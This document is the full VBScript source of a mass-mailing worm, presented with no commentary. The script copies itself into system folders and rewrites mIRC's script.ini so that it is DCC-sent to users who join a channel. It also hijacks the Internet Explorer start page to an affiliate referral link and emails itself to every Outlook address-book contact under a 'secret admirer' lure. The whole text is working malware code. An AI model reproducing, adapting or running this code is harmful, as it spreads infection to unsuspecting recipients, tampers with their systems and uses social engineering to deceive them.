On Error Resume Next
Dim newfilename, counter, rnum, rletter, fso, eq
Dim dirsystem, dirwin, dirtemp, ctr, file, vbscopy, dow
Dim memberid, linkurl
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()

sub main()
  On Error Resume Next
  dim wscr,rr
  set wscr=CreateObject("WScript.Shell")
  Set dirsystem = fso.GetSpecialFolder(1)
  Set dirsystem2 = fso.GetSpecialFolder(2)
  Set c = fso.GetFile(WScript.ScriptFullName)
  c.Copy(dirsystem&"\aa.vbs")
  c.Copy(dirsystem2&"\readme.txt.vbs")
  referrals()
  commission()
  listadriv()
end sub

sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub

sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders
for each f1 in sf
checkfiles(f1.path)
folderlist(f1.path)
next
end sub

sub checkfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,s
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or
(s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /msg $nick You have a secret admirer.
Im sending you more information!"
scriptini.WriteLine "n3=  /.dcc send $nick """ & dirsystem
& "\aa.vbs"""
scriptini.WriteLine "n4=}"
scriptini.close
eq=folderspec
end if
end if
next
end sub

sub genid()
  On Error Resume Next
  Randomize
  memberid = ""
  For counter = 1 to 3
  rnum = Int(26 * Rnd + 65)
  rletter = Chr(rnum)
  memberid = memberid & rletter
  Next
  rnum = Int(899 * Rnd + 100)
  memberid = memberid & rnum
  linkurl = "http://www.alladv" & "antage.com/go.asp?refid=" &
memberid
end sub

sub referrals()
  On Error Resume Next
  Dim num, downread, counter
  genid()
  regcreate "HKCU\Software\Microsoft\Internet
Explorer\Main\Start Page",linkurl
end sub

sub regcreate(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey,regvalue
end sub

function regget(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
end function

function fileexist(filespec)
  On Error Resume Next
  dim msg
  if (fso.FileExists(filespec)) Then
    msg = 0
    else
    msg = 1
  end if
  fileexist = msg
end function

sub commission()
  On Error Resume Next
  dim num, x, a, ctrlists, ctrentries, malead
  set out = WScript.CreateObject("Outlook.Application")
  set mapi = out.GetNameSpace("MAPI")
  for ctrlists = 1 to mapi.AddressLists.Count
    set a = mapi.AddressLists(ctrlists)
    x = 1
      for ctrentries = 1 to a.AddressEntries.Count
        genid()
        malead = a.AddressEntries(x)
        set male = out.CreateItem(0)
        male.Recipients.Add(malead)
        male.Subject = "You have a secret admirer!"
        male.Body = vbcrlf & "Have a look at " & linkurl &
vbcrlf & "and open enclosed document."
        male.Attachments.Add(dirsystem & "\aa.vbs")
        male.Send
        x = x + 1
      next
  next
  Set out = Nothing
  Set mapi = Nothing
end sub